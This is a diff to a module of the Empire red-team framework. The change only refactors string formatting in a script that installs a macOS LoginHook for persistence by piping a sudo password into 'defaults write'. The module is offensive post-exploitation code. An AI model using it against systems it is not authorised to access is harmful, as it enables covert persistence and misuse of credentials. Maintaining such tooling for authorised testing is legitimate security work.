@@ -1,10 +1,9 @@
-from builtins import object
 from typing import Dict, Optional, Tuple
 
 from empire.server.core.module_models import EmpireModule
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -15,10 +14,10 @@ class Module(object):
     ) -> Tuple[Optional[str], Optional[str]]:
         loginhook_script_path = params["LoginHookScript"]
         password = params["Password"]
-        password = password.replace("$", "\$")
-        password = password.replace("$", "\$")
-        password = password.replace("!", "\!")
-        password = password.replace("!", "\!")
+        password = password.replace("$", r"\$")
+        password = password.replace("$", r"\$")
+        password = password.replace("!", r"\!")
+        password = password.replace("!", r"\!")
         script = """
 import subprocess
 import sys
@@ -31,7 +30,7 @@ try:
         sys.exit()
     try:
         print(" [*] Setting script to proper linux permissions")
-        process = subprocess.Popen('chmod +x %s', stdout=subprocess.PIPE, shell=True)
+        process = subprocess.Popen('chmod +x {}', stdout=subprocess.PIPE, shell=True)
         process.communicate()
     except Exception as e:
         print("[!] Issues setting login hook (line 81): " + str(e))
@@ -39,13 +38,13 @@ try:
     print(" [*] Creating proper LoginHook")
 
     try:
-        process = subprocess.Popen('echo "%s" | sudo -S defaults write com.apple.loginwindow LoginHook %s', stdout=subprocess.PIPE, shell=True)
+        process = subprocess.Popen('echo "{}" | sudo -S defaults write com.apple.loginwindow LoginHook {}', stdout=subprocess.PIPE, shell=True)
         process.communicate()
     except Exception as e:
         print("[!] Issues setting login hook (line 81): " + str(e))
 
     try:
-        process = subprocess.Popen('echo "%s" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
+        process = subprocess.Popen('echo "{}" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
         print(" [*] LoginHook Output: ")
         result = process.communicate()
         result = result[0].strip()
@@ -56,7 +55,7 @@ try:
 except Exception as e:
     print("[!] Issue with LoginHook script: " + str(e))
 
-""" % (
+""".format(
             loginhook_script_path,
             password,
             loginhook_script_path,
